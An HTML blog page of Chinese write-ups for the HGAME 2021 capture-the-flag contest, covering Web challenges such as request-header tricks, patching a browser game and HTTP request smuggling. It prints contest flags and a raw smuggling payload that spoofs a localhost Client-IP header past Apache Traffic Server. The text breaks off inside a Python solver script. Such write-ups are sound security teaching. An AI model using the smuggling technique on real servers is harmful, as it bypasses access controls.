@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WebHitchhiking_in_the_Galaxyindex.php 内访问 HitchhikerGuide.php 可见 302 跳转，使用 BurpSuite GET 一次可以发现返回值是 405。于是尝试使用 POST 访问，得到了提示。 text1只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～  根据提示设置不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-CN/posts/484ca20c.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="WebHitchhiking_in_the_Galaxyindex.php 内访问 HitchhikerGuide.php 可见 302 跳转，使用 BurpSuite GET 一次可以发现返回值是 405。于是尝试使用 POST 访问，得到了提示。 text1只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～  根据提示设置不">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397284391566.58032d58806ed0125c5d55b67be68b8e13b06f7e.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397285255369.36fcffeea8fe03cdcb507790be3dc6e395c8d429.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397285458911.c03887b367f01410d362af29a3cadc215e0ee195.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286171995.aa9a72abfc6e87cd3217ff16f50aeff92f6eed16.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286433864.cafdb6939be55e367ed66b6c72327e681b582724.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286716761.7f2114e78469e470a2b380ea6d67bb020250a9a6.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287601915.5200e81022cc326b294603ce261ce7fc07565205.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613403884018.0cd3efd6b4d820df67eb99a4409453493d125142.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613403938612.0f0f5f5abe79131881163ae843866819ad85e8ee.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614927165219.2df95ad8448dd57aecc64076f8aa72938baefd1e.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614927402598.abe03a338b6dd2d432359de263bfa09222c24c9c.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287897688.c9f7249614a482f5f80ac758582ed09d4cf60d3a.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288170728.8d1b95abab4fa5e5e171d03a37c8c7dc52733800.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288474325.cef270df89e9fe21b6e8d685e8f4c829b0be0424.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288843522.154d75431f8302befbc81ff4829f7284b9e2c24a.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397289103836.51f782600e5994cc2d0f9b797db627dc4fa1af1b.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397289611138.c9121599247804ee6de2f77321405b1b44827e15.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290090528.e2f2c51101eb34efd17d2b3b440695b4cba5cff6.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290281286.29981c9d09e186d7d9ae09b75fb8f6487f330acc.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290528230.731ea50868a7a847acf6e194cbddb39e0ca0cb55.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290765999.712d328b969859426c837dec205e702f467e9517.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291060987.7db9c6685f0d53c12e15af7bce329a0edd205a9d.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291463382.36ecab86fd98c24d729c10e3be95c426648ff0fe.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291707926.5ff886d610de5ccf011304a7f6c76618711ef793.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291901884.c6bab1a317354791cb68dbc2278a19793a58555f.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292249542.eeac6bdb8d0fb67cad56b57bf50c85deb687d345.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292617887.a7920858a88af068a3df8ff8be75188506669e96.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292823942.8a5738b9adbc70c9dc141fbd4e986bf6ea243afb.png@200w.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292993797.3de98ca72000ada1b944261d195a8eb09df8ff1e.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397293155011.989e138acd4b2fdd8db0dd70ebc3aa55d3f69f8e.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397293546586.acdc82654c77ee6425baa219b4222a44d05865e6.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399386464.dcb47fe07ceed6f6d6ea23971438f9865d6f5826.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399410855.92e454ce47a9efd61de1f8e25156c0c769916628.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613400294020.b5ad967d3747e19900a851948dbd2e397263fbd8.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399763417.f841baa0b6c01f42c871bd01f3d4c507685fca84.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614930816508.8dbb6f09919d7b898a935f195e07f7eb444516ea.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614931302198.59bef60e3bd2489c98493476b8510366f87a15c8.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614932436434.9e17251eefdf4db39761c4a7e426d03d13497739.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614933099107.f6fbedecb5bf3678fd864560388c886334140e3c.png">
+<meta property="article:published_time" content="2021-02-07T16:50:00.000Z">
+<meta property="article:modified_time" content="2021-04-28T07:48:05.162Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397284391566.58032d58806ed0125c5d55b67be68b8e13b06f7e.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>HGAME 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-TW/posts/bf20b880.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-TW/posts/484ca20c.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="#">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="/zh-TW/posts/484ca20c.html">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/484ca20c.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&text=HGAME 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&title=HGAME 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&is_video=false&description=HGAME 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HGAME 2021&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/484ca20c.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&title=HGAME 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&title=HGAME 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&title=HGAME 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&title=HGAME 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&name=HGAME 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&t=HGAME 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hitchhiking-in-the-Galaxy"><span class="toc-number">1.1.</span> <span class="toc-text">Hitchhiking_in_the_Galaxy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#watermelon"><span class="toc-number">1.2.</span> <span class="toc-text">watermelon</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">代码审计法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9D%E8%97%8F%E8%B5%B0%E7%A7%81%E8%80%85"><span class="toc-number">1.3.</span> <span class="toc-text">宝藏走私者</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%BA%E5%95%86%E6%A3%80%E6%B5%8B%E9%B8%A1"><span class="toc-number">1.4.</span> <span class="toc-text">智商检测鸡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%B0%E7%A7%81%E8%80%85%E7%9A%84%E6%84%A4%E6%80%92"><span class="toc-number">1.5.</span> <span class="toc-text">走私者的愤怒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Liki%E7%9A%84%E7%94%9F%E6%97%A5%E7%A4%BC%E7%89%A9"><span class="toc-number">1.6.</span> <span class="toc-text">Liki的生日礼物</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forgetful"><span class="toc-number">1.7.</span> <span class="toc-text">Forgetful</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyDogR4U"><span class="toc-number">1.8.</span> <span class="toc-text">LazyDogR4U</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#200OK"><span class="toc-number">1.9.</span> <span class="toc-text">200OK!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Base%E5%85%A8%E5%AE%B6%E7%A6%8F"><span class="toc-number">2.1.</span> <span class="toc-text">Base全家福</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%B5%B7%E7%9C%BC%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%85%BB%E6%88%90%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">不起眼压缩包的养成的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Galaxy"><span class="toc-number">2.3.</span> <span class="toc-text">Galaxy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Word-RE-MASTER"><span class="toc-number">2.4.</span> <span class="toc-text">Word RE:MASTER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tools"><span class="toc-number">2.5.</span> <span class="toc-text">Tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Telegraph%EF%BC%9A1601-6639-3459-3134-0892"><span class="toc-number">2.6.</span> <span class="toc-text">Telegraph：1601 6639 3459 3134 0892</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hallucigenia"><span class="toc-number">2.7.</span> <span class="toc-text">Hallucigenia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-number">2.8.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-R-K"><span class="toc-number">2.9.</span> <span class="toc-text">A R K</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-R-C"><span class="toc-number">2.10.</span> <span class="toc-text">A R C</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HGAME 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-02-07T16:50:00.000Z" itemprop="datePublished">2021-02-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>index.php 内访问 HitchhikerGuide.php 可见 302 跳转，使用 BurpSuite GET 一次可以发现返回值是 405。于是尝试使用 POST 访问，得到了提示。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</span><br></pre></td></tr></table></figure>
+
+<p>根据提示设置不同请求头最终可得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397284391566.58032d58806ed0125c5d55b67be68b8e13b06f7e.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>稍微修改一下 <code>Math.random = function()&#123;return 0.5;&#125;</code> 使得所有水果都是橙子，同时把屏幕调窄。玩到 2000 分之后再把返回值设定为 1.8 使水果变为半个西瓜从而快速填充屏幕输掉这局比赛。如此即可拿到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397285255369.36fcffeea8fe03cdcb507790be3dc6e395c8d429.png"></p>
+<h4 id="代码审计法"><a href="#代码审计法" class="headerlink" title="代码审计法"></a>代码审计法</h4><p>合成大西瓜是使用 cocos 引擎开发的游戏，那么其核心部分一定在 <code>.../src/project.js</code>。游戏在结束后会放出 flag，因此搜索出 gameover 的部分，可以发现如下逻辑。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397285458911.c03887b367f01410d362af29a3cadc215e0ee195.png"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gameOverShowText: <span class="function"><span class="keyword">function</span> (<span class="params">e, t</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(e &gt; <span class="number">1999</span>)&#123;</span><br><span class="line">		alert(<span class="built_in">window</span>.atob(<span class="string">&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// this.ajaxLoad(&quot;http://www.wesane.com/admin.php/Gamescore/saveGamescore&quot;, &quot;gameScore=&quot; + e + &quot;&amp;gameId=&quot; + this.gameHttpId + &quot;&amp;gameType=&quot; + t, this.scoreResult)</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;do_you_know_cocos_game?&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p>
+</blockquote>
+<p>F12 看请求可以发现 <code>Server: ATS/7.1.2</code>，同时在 <code>.../secret</code> 页面有如下信息。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ONLY LOCALHOST(127.0.0.1) CAN ACCESS THE SECRET_DATA!</span><br><span class="line">YOUR Client-IP(Client-IP NOT FOUND IN HEADERS!) IS NOT ALLOWED!</span><br></pre></td></tr></table></figure>
+
+<p>于是尝试构造请求走私，使得服务器接收到一个包含 Client-IP 的 GET 请求。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length : 445</span><br><span class="line"></span><br><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>关键在于计算好 Content-Length 的长度并在前后添加空格，使得 ATS 可以正常转发而后端服务器将其忽略后识别为两个请求。使用 BurpSuite 发送两次构造好的请求就可以得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286171995.aa9a72abfc6e87cd3217ff16f50aeff92f6eed16.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;HtTp+sMUg9l1nG^i5~r3al1y-d4nG3r0Us!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>定积分计算，主要有三个路由，<code>.../api/verify</code> 负责检验答案，<code>.../api/getQuestion</code> 负责提供题目，<code>.../api/api/getStatus</code> 负责查询解出数。只需要写个脚本算出结果提交，最后再给出 session 的 cookie 即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://r4u.top:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        questionRaw = session.get(url + <span class="string">&quot;api/getQuestion&quot;</span>).content</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Parsing &#123;&#125;&quot;</span>.<span class="built_in">format</span>(questionRaw))</span><br><span class="line">        regex = <span class="string">r&quot;([-+]&#123;1&#125;)&lt;/mo&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&lt;/mn&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&quot;</span></span><br><span class="line">        matches = re.findall(regex, questionRaw.decode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line">        lowerLimit, upperLimit = (<span class="built_in">int</span>(matches[<span class="number">0</span>][<span class="number">0</span>] + matches[<span class="number">0</span>][<span class="number">1</span>]), <span class="built_in">int</span>(matches[<span class="number">0</span>][<span class="number">2</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Matching &#123;&#125; from &#123;&#125; to &#123;&#125;&quot;</span>.<span class="built_in">format</span>(matches, lowerLimit, upperLimit))</span><br><span class="line"></span><br><span class="line">        regex = <span 